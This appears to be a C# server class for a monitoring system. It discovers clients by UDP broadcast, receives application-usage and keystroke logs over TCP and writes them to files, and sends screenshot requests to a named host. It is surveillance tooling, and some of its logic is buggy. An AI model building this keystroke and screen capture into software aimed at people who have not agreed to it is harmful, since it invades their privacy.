using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using SimpleTCP;

namespace Server
{
    class ServerTools
    {
        public  static int hop;
        public static string[] keybuffer = new string[256];
        private static UdpClient Client = new UdpClient();
        public static void Broadcost()
        {
            hop = 0;
            Client = new UdpClient();
            var RequestData = Encoding.ASCII.GetBytes("Server Data");
            Client.EnableBroadcast = true;
            Client.Send(RequestData, RequestData.Length, new IPEndPoint(IPAddress.Broadcast, 1000));
            GetClientResponse();
        }
        private static void GetClientResponse()
        {
            var ServerEp = new IPEndPoint(IPAddress.Any, 0);
            try
            {
                while (true)
                {
                    var ServerResponseData = Client.Receive(ref ServerEp);
                    keybuffer[hop] = Encoding.ASCII.GetString(ServerResponseData);
                    hop++;
                }
            }
            catch (Exception ex)
            {
            }
        }
        public string GetFile(string filepath)
        {
            StreamReader sr = new StreamReader(filepath);
            string abc = sr.ReadToEnd();
            sr.Close();
            return abc;
        }
        public static void receiveFileApp()
        {
            TcpListener list;
            Stream stream;
            TcpClient client;
            int port = 12220;
            try
            {
                while (true)
                {
                    list = new TcpListener(IPAddress.Parse("127.0.0.1"), port);
                    list.Start();
                    client = list.AcceptTcpClient();
                    stream = client.GetStream();
                    StreamReader sr = new StreamReader(stream);
                    string result = sr.ReadToEnd();
                    StreamWriter sw = new StreamWriter("E:/Testing/AnuragApp.lab", true);
                    sw.Write(result);
                    sw.Close();
                    Console.WriteLine(result);
                }
                client.Close();
                list.Stop();
            }
            catch(Exception ex)
            {
                ServerTools st = new ServerTools();
                st.ErrorLog(ex.ToString());
            }

        }
        private void ErrorLog(string error)
        {
            StreamWriter sw = new StreamWriter("E:/Testing/Error.txt", true);
            sw.WriteLine(DateTime.Now.ToString() + "  " + error + "\n");
            sw.Close();
        }
        public static void receiveFileKeystroke()
        {
            TcpListener list;
            Stream stream;
            TcpClient client;
            int port = 12221;
            try
            {
                while (true)
                {
                    list = new TcpListener(IPAddress.Parse("127.0.0.1"), port);
                    list.Start();
                    client = list.AcceptTcpClient();
                    stream = client.GetStream();
                    StreamReader sr = new StreamReader(stream);
                    string result = sr.ReadToEnd();
                    StreamWriter sw = new StreamWriter("E:/Testing/AnuragKeystroke.lab", true);
                    sw.Write(result);
                    sw.Close();
                    Console.WriteLine(result);
                }
                client.Close();
                list.Stop();
            }
            catch (Exception ex)
            {
                ServerTools st = new ServerTools();
                st.ErrorLog(ex.ToString());
            }

        }
        public static void ReceiveFile()
        {
            receiveFileApp();
            receiveFileKeystroke();
        }
        static SimpleTcpClient client;
        public static void SendScreenshotSignal(string hostName)
        {
            client = new SimpleTcpClient();
            client.StringEncoder = Encoding.UTF8;
            var host = Dns.GetHostEntry("Papa-Romeo");
            var ipaddress = host.AddressList[6];
            client.Connect(ipaddress.ToString(), 51817);
            client.WriteLineAndGetReply("getScreenShot", TimeSpan.FromSeconds(10));
            client.DataReceived += client_DataReceived;
            
        }

        static void client_DataReceived(object sender, SimpleTCP.Message e)
        {
            MessageBox.Show(e.MessageString);
            client.Disconnect();
        }
    }
}
